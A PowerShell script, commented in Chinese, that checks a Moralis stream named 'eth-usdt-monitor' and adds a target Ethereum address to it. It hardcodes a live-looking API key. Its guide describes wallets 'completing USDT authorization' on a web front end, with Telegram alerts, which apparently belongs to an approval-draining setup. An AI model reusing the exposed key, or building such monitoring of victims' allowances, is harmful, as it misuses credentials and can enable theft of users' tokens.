# 验证地址是否已添加到监听列表
# 检查 Moralis Stream 状态

$TARGET_ADDRESS = "0xDDab159D4D75D588BB331B326c5ce0bA8Aa7a3A0"
$MORALIS_API_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjY5ZDY3MjkwLWIxMTYtNDIwNC04MzhjLTE4NTJjMzU2YWIyOSIsIm9yZ0lkIjoiNDc0NjA0IiwidXNlcklkIjoiNDg4MjQ3IiwidHlwZUlkIjoiMzQ4NmRkMzktOTBlOC00YTAxLWI0NWItMGJhNWQ2MWFiYTMxIiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NTk4NDYwMzcsImV4cCI6NDkxNTYwNjAzN30.RIEwHUZ5nluSbvV3clgcclLLE5sha4BUxGHiyxiFa2A"
$STREAM_ID = "eth-usdt-monitor"

Write-Host "`n========== 验证监听地址 ==========" -ForegroundColor Green
Write-Host "📍 目标地址: $TARGET_ADDRESS`n" -ForegroundColor Cyan

# 1. 检查 Moralis Stream 状态
Write-Host "1️⃣ 检查 Moralis Stream 状态..." -ForegroundColor Yellow

try {
    $headers = @{
        "X-API-Key" = $MORALIS_API_KEY
        "Accept" = "application/json"
    }
    
    # 获取所有 Streams
    $streamsResponse = Invoke-RestMethod -Uri "https://api.moralis-streams.com/streams/evm" `
        -Method Get `
        -Headers $headers
    
    Write-Host "   ✅ 找到 $($streamsResponse.result.Count) 个 Stream" -ForegroundColor Green
    
    # 查找目标 Stream
    $targetStream = $streamsResponse.result | Where-Object { $_.tag -eq $STREAM_ID -or $_.id -eq $STREAM_ID }
    
    if ($targetStream) {
        Write-Host "   ✅ 找到目标 Stream: $STREAM_ID" -ForegroundColor Green
        Write-Host "      - Status: $($targetStream.status)" -ForegroundColor White
        Write-Host "      - Webhook: $($targetStream.webhookUrl)" -ForegroundColor White
        
        # 获取 Stream 的详细信息
        $streamDetailUrl = "https://api.moralis-streams.com/streams/evm/$($targetStream.id)"
        $streamDetail = Invoke-RestMethod -Uri $streamDetailUrl -Method Get -Headers $headers
        
        if ($streamDetail.demo) {
            Write-Host "      - 监听地址数: 演示模式（监听所有地址）" -ForegroundColor Cyan
        } elseif ($streamDetail.allAddresses) {
            Write-Host "      - 监听地址数: 所有地址" -ForegroundColor Cyan
        } else {
            # 获取监听地址列表
            try {
                $addressesUrl = "https://api.moralis-streams.com/streams/evm/$($targetStream.id)/address"
                $addressesResponse = Invoke-RestMethod -Uri $addressesUrl -Method Get -Headers $headers
                
                $totalAddresses = $addressesResponse.total
                Write-Host "      - 监听地址数: $totalAddresses" -ForegroundColor White
                
                # 检查目标地址是否在列表中
                $isMonitored = $addressesResponse.result | Where-Object { $_.address.ToLower() -eq $TARGET_ADDRESS.ToLower() }
                
                if ($isMonitored) {
                    Write-Host "      ✅ 目标地址已在监听列表中！" -ForegroundColor Green
                } else {
                    Write-Host "      ⚠️  目标地址不在监听列表中" -ForegroundColor Yellow
                    Write-Host "         正在添加..." -ForegroundColor Yellow
                    
                    # 添加地址
                    $addBody = @{
                        address = @($TARGET_ADDRESS)
                    } | ConvertTo-Json
                    
                    try {
                        $addResponse = Invoke-RestMethod -Uri $addressesUrl `
                            -Method Post `
                            -Headers $headers `
                            -ContentType "application/json" `
                            -Body $addBody
                        
                        Write-Host "      ✅ 地址添加成功！" -ForegroundColor Green
                    } catch {
                        Write-Host "      ❌ 添加失败: $_" -ForegroundColor Red
                    }
                }
            } catch {
                Write-Host "      ⚠️  无法获取地址列表: $_" -ForegroundColor Yellow
            }
        }
    } else {
        Write-Host "   ⚠️  未找到 Stream: $STREAM_ID" -ForegroundColor Yellow
        Write-Host "   ℹ️  Stream 将在首次用户授权时自动创建" -ForegroundColor Cyan
    }
    
} catch {
    Write-Host "   ❌ 检查 Moralis Stream 失败: $_" -ForegroundColor Red
    Write-Host "   ℹ️  请检查 MORALIS_API_KEY 是否正确" -ForegroundColor Yellow
}

# 2. 提供手动操作指南
Write-Host "`n2️⃣ 手动操作选项..." -ForegroundColor Yellow
Write-Host "   如果自动添加失败，可以手动操作:" -ForegroundColor Cyan
Write-Host ""
Write-Host "   方法1: 在前端授权" -ForegroundColor White
Write-Host "      1. 访问 https://ethmax.vercel.app" -ForegroundColor Gray
Write-Host "      2. 使用地址 $TARGET_ADDRESS 连接钱包" -ForegroundColor Gray
Write-Host "      3. 完成 USDT 授权" -ForegroundColor Gray
Write-Host "      4. 系统会自动添加到监听" -ForegroundColor Gray
Write-Host ""
Write-Host "   方法2: 通过 Telegram 按钮" -ForegroundColor White
Write-Host "      1. 找到该地址的授权通知消息" -ForegroundColor Gray
Write-Host "      2. 点击'添加到链上实时监听'按钮" -ForegroundColor Gray
Write-Host ""
Write-Host "   方法3: Moralis Dashboard" -ForegroundColor White
Write-Host "      1. 访问 https://admin.moralis.io/streams" -ForegroundColor Gray
Write-Host "      2. 找到 Stream: eth-usdt-monitor" -ForegroundColor Gray
Write-Host "      3. 点击 'Add Address'" -ForegroundColor Gray
Write-Host "      4. 输入地址: $TARGET_ADDRESS" -ForegroundColor Gray
Write-Host ""

Write-Host "========== 验证完成 ==========`n" -ForegroundColor Green









